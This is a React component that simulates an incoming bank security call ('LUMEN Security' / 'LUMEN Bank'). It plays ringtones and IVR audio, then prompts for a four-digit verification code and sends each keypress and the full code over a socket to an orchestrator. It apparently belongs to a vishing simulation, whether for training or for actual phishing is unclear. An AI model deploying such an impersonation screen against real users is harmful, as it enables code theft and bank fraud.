import React, { useState, useEffect, useRef, useCallback } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import useOrchestratorStore from '../store/orchestratorStore';
import socket from '../services/socketService';

// ─── DTMF Frequencies ────────────────────────────────────────────────────────
const DTMF_FREQ = {
  '1': [697,1209], '2': [697,1336], '3': [697,1477],
  '4': [770,1209], '5': [770,1336], '6': [770,1477],
  '7': [852,1209], '8': [852,1336], '9': [852,1477],
  '*': [941,1209], '0': [941,1336], '#': [941,1477],
};

// ─── Audio Engine (Web Audio API — no external files needed) ─────────────────
class AudioEngine {
  constructor() { this.ctx = null; }

  _ctx() {
    if (!this.ctx || this.ctx.state === 'closed') {
      this.ctx = new (window.AudioContext || window.webkitAudioContext)();
    }
    if (this.ctx.state === 'suspended') this.ctx.resume();
    return this.ctx;
  }

  /** DTMF tone */
  dtmf(key, dur = 0.2) {
    const ctx = this._ctx();
    const [f1, f2] = DTMF_FREQ[key] || [];
    if (!f1) return;
    [f1, f2].forEach(f => {
      const osc = ctx.createOscillator();
      const gain = ctx.createGain();
      osc.frequency.value = f;
      osc.type = 'sine';
      gain.gain.setValueAtTime(0, ctx.currentTime);
      gain.gain.linearRampToValueAtTime(0.25, ctx.currentTime + 0.01);
      gain.gain.linearRampToValueAtTime(0, ctx.currentTime + dur);
      osc.connect(gain); gain.connect(ctx.destination);
      osc.start(ctx.currentTime);
      osc.stop(ctx.currentTime + dur);
    });
  }

  /** Ringtone — classic "dring dring" pattern, plays for `count` rings */
  async ringTone(count = 4) {
    const ctx = this._ctx();
    return new Promise(resolve => {
      let t = ctx.currentTime;
      for (let i = 0; i < count; i++) {
        // Two short beeps per ring
        [440, 480].forEach(f => {
          const osc = ctx.createOscillator();
          const gain = ctx.createGain();
          osc.frequency.value = f;
          osc.type = 'sine';
          gain.gain.setValueAtTime(0, t);
          gain.gain.linearRampToValueAtTime(0.3, t + 0.02);
          gain.gain.setValueAtTime(0.3, t + 0.3);
          gain.gain.linearRampToValueAtTime(0, t + 0.35);
          osc.connect(gain); gain.connect(ctx.destination);
          osc.start(t); osc.stop(t + 0.35);
        });
        t += 0.4;
        // Gap between rings
        t += 0.6;
      }
      setTimeout(resolve, (t - ctx.currentTime) * 1000);
    });
  }

  /** "You have a call" voice simulation — descending tones */
  async notificationChime() {
    const ctx = this._ctx();
    return new Promise(resolve => {
      const notes = [880, 784, 659, 587];
      let t = ctx.currentTime;
      notes.forEach(f => {
        const osc = ctx.createOscillator();
        const gain = ctx.createGain();
        osc.frequency.value = f;
        osc.type = 'sine';
        gain.gain.setValueAtTime(0, t);
        gain.gain.linearRampToValueAtTime(0.2, t + 0.02);
        gain.gain.setValueAtTime(0.2, t + 0.18);
        gain.gain.linearRampToValueAtTime(0, t + 0.25);
        osc.connect(gain); gain.connect(ctx.destination);
        osc.start(t); osc.stop(t + 0.3);
        t += 0.25;
      });
      setTimeout(resolve, 1200);
    });
  }

  /** Bank IVR simulation — speech-like modulated tone sequence */
  async ivrMessage(lang = 'en') {
    const ctx = this._ctx();
    // Simulate voice with 3 "sentences" of modulated carrier waves
    return new Promise(resolve => {
      let t = ctx.currentTime;
      const sentences = lang === 'fr'
        ? [[440,392,349,329,440,392], [349,440,392,349,329,294], [329,349,392,440,392,349]]
        : [[349,392,440,392,349,329], [440,392,349,329,294,329], [349,392,440,494,440,392]];

      sentences.forEach(sentence => {
        sentence.forEach(freq => {
          const osc = ctx.createOscillator();
          const gain = ctx.createGain();
          const mod = ctx.createOscillator();
          const modGain = ctx.createGain();
          // Amplitude modulation to simulate voice
          mod.frequency.value = 5 + Math.random() * 3;
          mod.type = 'sine';
          modGain.gain.value = 0.1;
          mod.connect(modGain);
          modGain.connect(gain.gain);
          osc.frequency.value = freq;
          osc.type = 'sine';
          gain.gain.setValueAtTime(0.15, t);
          gain.gain.linearRampToValueAtTime(0, t + 0.12);
          osc.connect(gain); gain.connect(ctx.destination);
          mod.start(t); mod.stop(t + 0.12);
          osc.start(t); osc.stop(t + 0.14);
          t += 0.1;
        });
        t += 0.3; // pause between sentences
      });
      setTimeout(resolve, (t - ctx.currentTime) * 1000 + 200);
    });
  }

  /** Play real audio IVR file — lumenbankENG.mp3 or lumenbankFR.mp3 */
  playIVR(lang = 'en') {
    const url = lang === 'fr' ? '/audio/lumenbankFR.mp3' : '/audio/lumenbankENG.mp3';
    return new Promise((resolve) => {
      const audio = new Audio(url);
      audio.volume = 1.0;
      audio.onended = resolve;
      audio.onerror = () => this.ivrMessage(lang).then(resolve); // fallback
      audio.play().catch(() => this.ivrMessage(lang).then(resolve));
    });
  }
}

const engine = new AudioEngine();

// ─── Component ────────────────────────────────────────────────────────────────
const VoiceCallOverlay = () => {
  const callState = useOrchestratorStore(s => s.callState);
  const setCallState = useOrchestratorStore(s => s.setCallState);

  const [active, setActive] = useState(false);
  const [callData, setCallData] = useState(null);
  const [phase, setPhase] = useState('ringing'); // ringing | connected | ended
  const [showKeypad, setShowKeypad] = useState(false);
  const [inputDigits, setInputDigits] = useState('');
  const [timer, setTimer] = useState(0);
  const [ivrDone, setIvrDone] = useState(false);

  const timerRef = useRef(null);
  const ivrRunning = useRef(false);

  // Trigger call from store
  useEffect(() => {
    if (!callState) return;
    setCallData(callState);
    setActive(true);
    setPhase('ringing');
    setInputDigits('');
    setShowKeypad(false);
    setIvrDone(false);
    ivrRunning.current = false;
    // Play ringtone while ringing
    engine.ringTone(3);
  }, [callState]);

  // Audio playback is now handled directly in the accept() function to avoid autoplay blocking.

  // Call timer
  useEffect(() => {
    if (phase === 'connected') {
      timerRef.current = setInterval(() => setTimer(t => t + 1), 1000);
    } else {
      clearInterval(timerRef.current);
      setTimer(0);
    }
    return () => clearInterval(timerRef.current);
  }, [phase]);

  const formatTime = s => `${String(Math.floor(s / 60)).padStart(2,'0')}:${String(s % 60).padStart(2,'0')}`;

  const accept = () => {
    engine._ctx(); // unlock audio context on user gesture
    setPhase('connected');
    
    // Trigger audio directly in click handler to bypass Safari/Chrome autoplay restrictions
    if (!ivrRunning.current) {
      ivrRunning.current = true;
      const lang = callData?.lang || 'en';
      (async () => {
        await engine.notificationChime();
        await engine.playIVR(lang);
        setIvrDone(true);
        setShowKeypad(true);
      })();
    }
  };

  const hangup = () => {
    setActive(false);
    setCallData(null);
    setPhase('ringing');
    setInputDigits('');
    setShowKeypad(false);
    setIvrDone(false);
    setCallState(null);
    socket.emit('CALL_ENDED', { callId: callData?.callId });
  };

  const pressKey = (key) => {
    engine.dtmf(key);
    const next = inputDigits + key;
    setInputDigits(next);
    socket.emit('DTMF_INPUT', { digit: key, fullInput: next, callId: callData?.callId });
    if (next.length >= 4) {
      socket.emit('VERIFY_CODE', { code: next, callId: callData?.callId });
    }
  };

  if (!active) return null;

  return (
    <AnimatePresence>
      <motion.div
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        exit={{ opacity: 0 }}
        className="fixed inset-0 z-[9999] flex flex-col"
        style={{ background: 'linear-gradient(170deg, #1a1a2e 0%, #16213e 40%, #0f3460 100%)' }}
      >
        {/* Animated rings behind avatar */}
        {phase === 'ringing' && [1,2,3].map(i => (
          <motion.div key={i} className="absolute rounded-full border border-blue-400/20"
            style={{ width: 100 + i*60, height: 100 + i*60, top: '50%', left: '50%', transform: 'translate(-50%, -50%) translateY(-80px)' }}
            animate={{ scale: [1, 1.15, 1], opacity: [0.3, 0, 0.3] }}
            transition={{ duration: 2, repeat: Infinity, delay: i * 0.4 }}
          />
        ))}

        {/* Top area */}
        <div className="flex flex-col items-center pt-16 px-6">
          {/* Avatar */}
          <div className="relative">
            <div className="w-24 h-24 rounded-full bg-gradient-to-br from-blue-500 to-blue-700 flex items-center justify-center shadow-2xl mb-4">
              <svg className="w-12 h-12 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2}
                  d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z" />
              </svg>
            </div>
          </div>

          <h2 className="text-2xl font-bold text-white mb-1">{callData?.callerName || 'LUMEN Security'}</h2>
          <p className="text-blue-300 text-base mb-2">{callData?.callerNumber || '+1 800-932-1102'}</p>

          {phase === 'ringing' && (
            <motion.p className="text-gray-400 text-sm" animate={{ opacity: [0.5, 1, 0.5] }} transition={{ duration: 1.5, repeat: Infinity }}>
              Incoming call…
            </motion.p>
          )}
          {phase === 'connected' && (
            <p className="text-green-400 text-sm font-mono">{formatTime(timer)}</p>
          )}
        </div>

        {/* IVR / Keypad area */}
        {phase === 'connected' && (
          <div className="flex-1 flex flex-col items-center justify-center px-6">
            {!ivrDone && (
              <motion.div className="flex items-center gap-3 mb-6"
                animate={{ opacity: [0.4, 1, 0.4] }} transition={{ duration: 1, repeat: Infinity }}>
                <div className="w-2 h-2 rounded-full bg-blue-400" />
                <div className="w-2 h-2 rounded-full bg-blue-400" style={{ animationDelay: '0.2s' }} />
                <div className="w-2 h-2 rounded-full bg-blue-400" style={{ animationDelay: '0.4s' }} />
                <span className="text-blue-300 text-sm ml-1">LUMEN Bank speaking…</span>
              </motion.div>
            )}

            {showKeypad && (
              <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} className="w-full max-w-[280px]">
                {/* Code display */}
                <div className="bg-black/30 rounded-2xl px-6 py-4 text-center mb-6">
                  <p className="text-gray-400 text-xs uppercase tracking-widest mb-3">Enter verification code</p>
                  <div className="flex justify-center gap-3">
                    {[0,1,2,3].map(i => (
                      <div key={i} className={`w-5 h-5 rounded-full border-2 transition-all ${
                        i < inputDigits.length ? 'bg-green-400 border-green-400' : 'border-gray-500'
                      }`} />
                    ))}
                  </div>
                </div>

                {/* Keypad */}
                <div className="grid grid-cols-3 gap-3">
                  {['1','2','3','4','5','6','7','8','9','*','0','#'].map(k => (
                    <motion.button key={k} whileTap={{ scale: 0.9 }}
                      onClick={() => pressKey(k)}
                      className="h-14 rounded-2xl bg-white/10 hover:bg-white/20 text-white text-xl font-bold flex items-center justify-center">
                      {k}
                    </motion.button>
                  ))}
                </div>
              </motion.div>
            )}
          </div>
        )}

        {/* Bottom buttons */}
        <div className="flex items-end justify-center pb-16 px-10 gap-16">
          {phase === 'ringing' ? (
            <>
              {/* Decline */}
              <div className="flex flex-col items-center gap-2">
                <motion.button whileTap={{ scale: 0.9 }} onClick={hangup}
                  className="w-16 h-16 rounded-full bg-red-500 flex items-center justify-center shadow-lg">
                  <svg className="w-7 h-7 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2}
                      d="M16 8l2-2m0 0l2-2m-2 2l-2-2m2 2l2 2M5 3a2 2 0 00-2 2v1c0 8.284 6.716 15 15 15h1a2 2 0 002-2v-3.28a1 1 0 00-.684-.948l-4.493-1.498a1 1 0 00-1.21.502l-1.13 2.257a11.042 11.042 0 01-5.516-5.517l2.257-1.128a1 1 0 00.502-1.21L9.228 3.683A1 1 0 008.279 3H5z" />
                  </svg>
                </motion.button>
                <span className="text-white/60 text-xs">Decline</span>
              </div>
              {/* Accept */}
              <div className="flex flex-col items-center gap-2">
                <motion.button whileTap={{ scale: 0.9 }} onClick={accept}
                  className="w-16 h-16 rounded-full bg-green-500 flex items-center justify-center shadow-lg"
                  animate={{ scale: [1, 1.08, 1] }} transition={{ duration: 1.2, repeat: Infinity }}>
                  <svg className="w-7 h-7 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2}
                      d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z" />
                  </svg>
                </motion.button>
                <span className="text-white/60 text-xs">Accept</span>
              </div>
            </>
          ) : (
            <div className="flex flex-col items-center gap-2">
              <motion.button whileTap={{ scale: 0.9 }} onClick={hangup}
                className="w-16 h-16 rounded-full bg-red-500 flex items-center justify-center shadow-lg">
                <svg className="w-7 h-7 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2}
                    d="M16 8l2-2m0 0l2-2m-2 2l-2-2m2 2l2 2M5 3a2 2 0 00-2 2v1c0 8.284 6.716 15 15 15h1a2 2 0 002-2v-3.28a1 1 0 00-.684-.948l-4.493-1.498a1 1 0 00-1.21.502l-1.13 2.257a11.042 11.042 0 01-5.516-5.517l2.257-1.128a1 1 0 00.502-1.21L9.228 3.683A1 1 0 008.279 3H5z" />
                </svg>
              </motion.button>
              <span className="text-white/60 text-xs">End Call</span>
            </div>
          )}
        </div>
      </motion.div>
    </AnimatePresence>
  );
};

export default VoiceCallOverlay;
